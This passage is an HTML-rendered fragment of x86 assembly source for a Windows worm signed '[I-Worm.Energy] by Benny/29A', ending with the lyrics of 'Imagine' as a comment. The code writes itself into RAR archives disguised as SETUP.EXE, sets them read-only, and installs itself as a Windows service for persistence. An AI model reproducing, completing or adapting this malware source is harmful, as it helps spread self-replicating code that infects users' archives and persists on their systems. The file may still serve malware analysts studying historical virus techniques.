</span><span class="sc5">RARHeaderCRC</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARType</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">RARFlags</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">RARHSize</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc0">
</span><span class="sc5">RARCompressed</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2000h</span><span class="sc0">
</span><span class="sc5">RAROriginal</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">2000h</span><span class="sc0">
</span><span class="sc5">RAROS</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARCRC32</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARFileDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">RARNeedVer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">RARMethod</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">RARFNameSize</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARName</span><span class="sc0">
</span><span class="sc5">RARAttrib</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RARName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SETUP.EXE'</span><span class="sc0">
</span><span class="sc5">end_RAR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_wf</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;write RAR file header</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_wf</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;write the worm</span><span class="sc0">

</span><span class="sc5">end_file2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_vf</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;release the memory</span><span class="sc0">
</span><span class="sc5">end_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">;close the archive</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_sfaa</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;set READ-ONLY attribute</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">;handle...</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_ch</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;close file handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;procedure for </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;calculating CRC32s</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;at run-time</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">   
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">   
        </span><span class="sc6">lodsb</span><span class="sc0">          
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">SVCHandler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc5">ThreadEntry</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc1">;log on to SCM</span><span class="sc0">
</span><span class="sc5">SVCRegister</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_dt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_name</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">service_start</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_dt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StartServiceCtrlDispatcherA</span><span class="sc0">     </span><span class="sc1">;start service dispatcher</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">e_svc</span><span class="sc0">                   </span><span class="sc1">;quit if error (no service</span><span class="sc0">
                            </span><span class="sc1">;requestz)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitThread</span><span class="sc0">              </span><span class="sc1">;terminate this thread</span><span class="sc0">

</span><span class="sc5">service_start</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;execution goes here...</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_seh</span><span class="sc4">&gt;</span><span class="sc0">           </span><span class="sc1">;setup SEH frame</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SVCHandler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_name</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RegisterServiceCtrlHandlerA</span><span class="sc0">     </span><span class="sc1">;register service control</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;handler</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_svc</span><span class="sc0">                   </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ss</span><span class="sc0">
</span><span class="sc5">ss_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ss</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetServiceStatus</span><span class="sc0">            </span><span class="sc1">;set service status</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseServiceHandle</span><span class="sc0">          </span><span class="sc1">;close service handle</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">e_svc</span><span class="sc0">                   </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">SVCRegister</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc1">;create item at SCM</span><span class="sc0">
</span><span class="sc5">SVCCreate</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F0000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenSCManagerA</span><span class="sc0">              </span><span class="sc1">;get handle to SCM</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_scm0</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;   push    000F0000h or 1 or 2 or 4 or 8 or 10h or 20h or 40h or 80h or 100h</span><span class="sc0">
</span><span class="sc1">;   push    offset e_name+5</span><span class="sc0">
</span><span class="sc1">;   push    esi</span><span class="sc0">
</span><span class="sc1">;   call    OpenServiceA                ;*** debug!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   push    eax</span><span class="sc0">
</span><span class="sc1">;   push    eax</span><span class="sc0">
</span><span class="sc1">;   call    DeleteService               ;*** debug!</span><span class="sc0">
</span><span class="sc1">;   call    CloseServiceHandle          ;*** debug!</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sys_dir</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F0000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_name</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateServiceA</span><span class="sc0">              </span><span class="sc1">;create service item</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;at SCM</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">e_scm1</span><span class="sc0">                  </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseServiceHandle</span><span class="sc0">          </span><span class="sc1">;close service handlez</span><span class="sc0">
</span><span class="sc5">e_scm1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseServiceHandle</span><span class="sc0">          </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">e_scm0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">SVCCreate</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[I-Worm.Energy] by Benny/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                            </span><span class="sc1">;signature</span><span class="sc0">
    </span><span class="sc5">proc_dump</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">PROC_COUNT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;buffer for PIDz</span><span class="sc0">
    </span><span class="sc5">worm_name</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;buffer for filename</span><span class="sc0">
    </span><span class="sc5">tmp</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;temporary variable</span><span class="sc0">
    </span><span class="sc5">sys_dir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;buffer for system dir.</span><span class="sc0">
    </span><span class="sc5">arc_buffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;buffer for archive</span><span class="sc0">
                            </span><span class="sc1">;filename</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;...end of virus.</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">Start</span><span class="sc0">                        </span><span class="sc1">;.</span><span class="sc0">


</span><span class="sc1">;bonus:</span><span class="sc0">
</span><span class="sc1">;here are lyrics from "Imagine", one very nice song from John Lennon.</span><span class="sc0">

</span><span class="sc1">;       Imagine there's no heaven, </span><span class="sc0">
</span><span class="sc1">;       It's easy if you try, </span><span class="sc0">
</span><span class="sc1">;       No hell below us, </span><span class="sc0">
</span><span class="sc1">;       Above us only sky, </span><span class="sc0">
</span><span class="sc1">;       Imagine all the people </span><span class="sc0">
</span><span class="sc1">;       living for today... </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Imagine there's no countries, </span><span class="sc0">
</span><span class="sc1">;       It isn't hard to do, </span><span class="sc0">
</span><span class="sc1">;       Nothing to kill or die for, </span><span class="sc0">
</span><span class="sc1">;       No religion too, </span><span class="sc0">
</span><span class="sc1">;       Imagine all the people </span><span class="sc0">
</span><span class="sc1">;       living life in peace... </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       You may say I'm a dreamer, </span><span class="sc0">
</span><span class="sc1">;       but I'm not the only one, </span><span class="sc0">
</span><span class="sc1">;       I hope some day you'll join us, </span><span class="sc0">
</span><span class="sc1">;       And the world will live as one.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Imagine no possesions, </span><span class="sc0">
</span><span class="sc1">;       I wonder if you can, </span><span class="sc0">
</span><span class="sc1">;       No need for greed or hunger, </span><span class="sc0">
</span><span class="sc1">;       A brotherhood of man, </span><span class="sc0">
</span><span class="sc1">;       Imagine all the people </span><span class="sc0">
</span><span class="sc1">;       Sharing all the world... </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       You may say I'm a dreamer, </span><span class="sc0">
</span><span class="sc1">;       but I'm not the only one, </span><span class="sc0">
</span><span class="sc1">;       I hope some day you'll join us, </span><span class="sc0">
</span><span class="sc1">;       And the world will live as one.</span><span class="sc0">
</span></div></body>
</html>
